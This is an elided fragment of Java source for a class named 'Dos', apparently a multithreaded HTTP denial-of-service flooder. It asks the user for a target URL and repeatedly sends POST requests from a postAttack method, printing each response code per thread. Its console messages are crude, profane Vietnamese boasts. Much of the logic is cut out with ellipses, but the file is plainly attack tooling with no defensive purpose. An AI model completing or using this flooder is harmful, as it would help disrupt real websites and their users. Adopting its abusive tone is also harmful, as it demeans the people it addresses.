...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.print("Địt Đưa Cái Web Url Vào Cu😎: ");
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("Bố Đang Kết Nối Với Url: " + url);

        String[] SUrl = url.split("://");

        System.out.println("⚠Chờ Bố Mày Xíu [!]");
        ...
        System.out.println("🔒Bố Đã Kết Nối Thành Công🎀");
        ...
        System.out.println("Bố mày đang đót oki 👌");
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("bố đang đót cmm: " + responseCode + "Thread: " + this.seq);
    }
